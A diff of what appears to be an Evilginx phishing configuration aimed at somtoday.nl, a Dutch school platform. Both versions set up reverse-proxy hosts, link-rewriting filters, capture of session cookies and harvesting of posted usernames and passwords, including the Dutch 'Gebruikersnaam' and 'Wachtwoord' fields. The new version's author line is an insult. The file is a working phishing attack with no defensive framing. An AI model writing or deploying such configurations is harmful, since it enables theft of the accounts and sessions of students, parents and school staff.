@@ -1,44 +1,24 @@
-author: '@kerb'
+author: '@JERPUS JULLIE KANKER MOEDRS'
 min_ver: '2.3.0'
 proxy_hosts:
- - {phish_sub: 'auth', orig_sub: 'auth', domain: 'somtoday.nl', session: true, is_landing: false, auto_filter: false}
- - {phish_sub: 'dealerhub', orig_sub: 'dealerhub', domain: 'somtoday.nl', session: true, is_landing: true, auto_filter: false}
- - {phish_sub: 'www', orig_sub: 'www', domain: 'somtoday.nl', session: true, is_landing: false, auto_filter: false}
-
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'somtoday.nl', session: true, is_landing: true}
+  - {phish_sub: 'events', orig_sub: 'events', domain: 'somtoday.nl', session: false, is_landing: false}
 sub_filters:
- - {triggers_on: 'elo.somtoday.nl', orig_sub: 'auth', domain: 'somtoday.nl', search: 'elo.somtoday.nl', replace: 'auth.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
- - {triggers_on: 'elo.somtoday.nl', orig_sub: 'auth', domain: 'somtoday.nl', search: 'www.somtoday.nl', replace: 'www.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
-
- - {triggers_on: 'elo.somtoday.nl', orig_sub: 'auth', domain: 'somtoday.nl', search: 'elo.somtoday.nl', replace: 'auth.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
- - {triggers_on: 'elo.somtoday.nl', orig_sub: 'auth', domain: 'somtoday.nl', search: 'www.somtoday.nl', replace: 'www.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
-
- - {triggers_on: 'elo.somtoday.nl', orig_sub: 'auth', domain: 'somtoday.nl', search: 'elo.somtoday.nl', replace: 'auth.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
- - {triggers_on: 'elo.somtoday.nl', orig_sub: 'auth', domain: 'somtoday.nl', search: 'www.somtoday.nl', replace: 'www.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
-
- 
+  - {triggers_on: 'somtoday.nl', orig_sub: 'www', domain: 'somtoday.nl', search: 'action="https://{hostname}', replace: 'action="https://{hostname}', mimes: ['text/html', 'application/json']}
+  - {triggers_on: 'somtoday.nl', orig_sub: 'www', domain: 'somtoday.nl', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json']}
+  - {triggers_on: 'elo.somtoday.nl', orig_sub: 'www', domain: 'somtoday.nl', search: 'action="https://{hostname}', replace: 'action="https://{hostname}', mimes: ['text/html', 'application/json']}
+  - {triggers_on: 'elo.somtoday.nl', orig_sub: 'www', domain: 'somtoday.nl', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json']}
 auth_tokens:
- - domain: '.somtoday.nl'
-   keys: ['.*,regexp']
- - domain: 'www.somtoday.nl'
-   keys: ['.*,regexp']
- - domain: 'elo.somtoday.nl'
-   keys: ['.*,regexp']
- - domain: 'somtoday.nl'
-   keys: ['.*,regexp']
-
+  - domain: '.somtoday.nl'
 credentials:
- username:
-  key: 'username'
-  search: '(.*)'
-  type: 'post'
- password:
-  key: 'password'
-  search: '(.*)'
-  type: 'post'
-
-auth_urls:
- - '/.*/profile/edit'
-
+  username:
+    key: 'Gebruikersnaam'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'Wachtwoord'
+    search: '(.*)'
+    type: 'post'
 login:
   domain: 'somtoday.nl'
-  path: '/en/profile/edit'
+  path: '/login'
